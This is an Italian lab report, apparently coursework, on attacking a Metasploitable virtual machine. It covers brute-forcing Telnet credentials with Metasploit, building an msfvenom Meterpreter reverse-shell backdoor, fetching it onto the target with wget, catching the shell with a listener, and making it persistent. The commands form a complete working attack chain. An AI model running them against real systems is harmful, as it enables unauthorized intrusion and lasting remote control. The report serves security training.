# Consegna S7/L2 | Hacking con Metasploit

## 🎯 Obiettivo
L'obiettivo di questa esercitazione è stato esplorare e applicare tecniche di **ethical hacking** utilizzando **Metasploit Framework** per:
1. Sfruttare una vulnerabilità del servizio **Telnet** presente sulla macchina Metasploitable.
2. Creare una **backdoor personalizzata** con **msfvenom**, compatibile con l'architettura a 32-bit, e trasferirla sul target per ottenere una sessione shell e, volendo, renderla **persistente**.

Questa relazione è scritta in modo scorrevole, con l'obiettivo di essere chiara anche per chi non ha familiarità con questi strumenti. 🚀

---

## 1. Sfruttamento del servizio Telnet
### 🛠️ Strumenti utilizzati
- **Metasploit Framework (msf6)**
- **Kali Linux**
- **Metasploitable** (target)
- **Nmap** per la scansione delle porte

### 📋 Procedura
1. **Scansione delle porte aperte**: 
   Utilizzando **Nmap**, abbiamo individuato che il servizio **Telnet** è attivo sulla porta **23** del target:
   ```bash
   nmap -p 23 192.168.50.3
   ```
   Questo passaggio è essenziale per rilevare servizi vulnerabili esposti.

2. **Accesso al servizio Telnet con Metasploit**:
   Per sfruttare questa vulnerabilità, abbiamo utilizzato il modulo **telnet_login** di Metasploit per effettuare un attacco brute force e ottenere le credenziali.
   
   ```bash
   msfconsole
   use auxiliary/scanner/telnet/telnet_login
   set RHOSTS 192.168.50.3
   set USER_FILE users.txt
   set PASS_FILE passwords.txt
   run
   ```
   Una volta trovate le credenziali corrette, siamo riusciti ad accedere alla macchina tramite **Telnet**.

3. **Accesso alla shell**:
   L'accesso Telnet ci ha fornito una **shell interattiva** come utente privilegiato. Questo è stato il punto di partenza per l'exploit successivo.

---

## 2. Creazione e utilizzo della backdoor
### 🧰 Strumenti utilizzati
- **msfvenom**: Generazione del payload
- **Metasploit Framework**: Configurazione del listener
- **Python HTTP Server**: Trasferimento del file
- **wget**: Download sul target

### 🚀 Creazione della backdoor
Abbiamo scelto di utilizzare **msfvenom** per creare un payload **reverse shell**. La scelta è ricaduta su **linux/x86/meterpreter_reverse_tcp** perché:
1. **Compatibilità**: Metasploitable gira su architettura a **32-bit**, quindi la backdoor è stata compilata per x86.
2. **Meterpreter**: Consente un controllo avanzato del sistema target rispetto a una shell classica.

Il comando utilizzato è stato:
```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.50.2 LPORT=4444 -f elf -o backdoor_ftp.elf
```
- **`-p`**: Specifica il payload.
- **`LHOST` e `LPORT`**: Definiscono l'indirizzo IP e la porta di ascolto della nostra macchina Kali.
- **`-f elf`**: Output in formato ELF (eseguibile Linux).
- **`-o`**: Salva il file con il nome `backdoor_ftp.elf`.

### 📤 Trasferimento della backdoor
Per trasferire il file generato sul target, abbiamo usato un server HTTP semplice su Kali e **wget** su Metasploitable:

1. **Avvio del server HTTP su Kali**:
   ```bash
   python3 -m http.server 8080
   ```
2. **Download del file sul target**:
   ```bash
   cd /tmp
   wget http://192.168.50.2:8080/backdoor_ftp.elf
   ```

### 🔑 Esecuzione della backdoor
Una volta trasferita la backdoor:
1. **Permessi di esecuzione**:
   ```bash
   chmod +x backdoor_ftp.elf
   ```
2. **Avvio della backdoor**:
   ```bash
   ./backdoor_ftp.elf
   ```

### 📡 Configurazione del listener su Metasploit
Per ricevere la connessione inversa, abbiamo configurato il modulo **multi/handler**:
```bash
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter_reverse_tcp
set LHOST 192.168.50.2
set LPORT 4444
exploit
```

### 🎉 Risultato: Sessione Meterpreter
La backdoor si è connessa correttamente, permettendoci di ottenere una **sessione Meterpreter** con accesso completo al sistema target.

**Cosa abbiamo potuto fare con Meterpreter?**
- Navigare nel filesystem con `ls` e `cd`
- Caricare e scaricare file con `upload` e `download`
- Ottenere informazioni sul sistema con `sysinfo`
- Eseguire comandi direttamente sul target

### 🔒 Persistenza (facoltativa)
Abbiamo reso la backdoor persistente utilizzando il modulo `persistence` di Meterpreter:
```bash
run persistence -X -i 5 -p 4444 -r 192.168.50.2
```
- **`-X`**: Installa come servizio di sistema.
- **`-i`**: Intervallo di riconnessione ogni 5 secondi.
- **`LPORT` e `LHOST`**: Configurazione di ascolto per la nostra macchina.

---

## 🏁 Conclusione
Questa esercitazione ha mostrato come:
1. **Identificare e sfruttare** una vulnerabilità in un servizio esposto (Telnet).
2. **Creare una backdoor personalizzata** con **msfvenom** adattandola all'architettura del target.
3. **Ottenere accesso avanzato** con Meterpreter, dimostrando anche come implementare la persistenza.

Questa attività fornisce una panoramica concreta sulle tecniche di **post-exploitation**, evidenziando la necessità di proteggere sistemi vulnerabili. 


---

## ⚠️ Note
Questo documento è a scopo puramente educativo e dimostrativo per la sicurezza informatica. Ogni utilizzo improprio è severamente vietato. 🚨
